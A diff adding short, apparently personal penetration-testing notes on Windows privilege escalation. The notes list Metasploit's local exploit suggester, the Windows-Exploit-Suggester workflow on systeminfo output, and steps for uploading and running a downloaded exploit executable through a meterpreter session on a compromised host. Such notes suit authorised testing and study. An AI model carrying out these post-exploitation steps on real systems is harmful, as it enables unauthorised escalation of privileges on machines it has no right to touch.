@@ -1,0 +1,20 @@
+method 1 : 
+    - use post/multi/recon/local_exploit_suggester
+    - set session SESSION_NUMBER
+    - run
+
+method 2 : 
+    - git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+    - in meterpreter session : 
+    - shell
+    - systeminfo
+    - copy all this informations to a systeminfo.txt file on the attacker machine
+    - cd Windows-Exploit-Suggester
+    - ./windows-exploit-suggester.py --update
+    - ./windows-exploit-suggester.py --database XLS_FILE --systeminfo /PATH_to_SYSTEMINFO.TXT
+        - this gives some exploit so do some search on google/exploit-db to download the exploit
+    - in a meterpretter session : 
+        - cd Temp\\
+        - upload /path_to/executable.exe
+        - shell
+        .\executable.exe
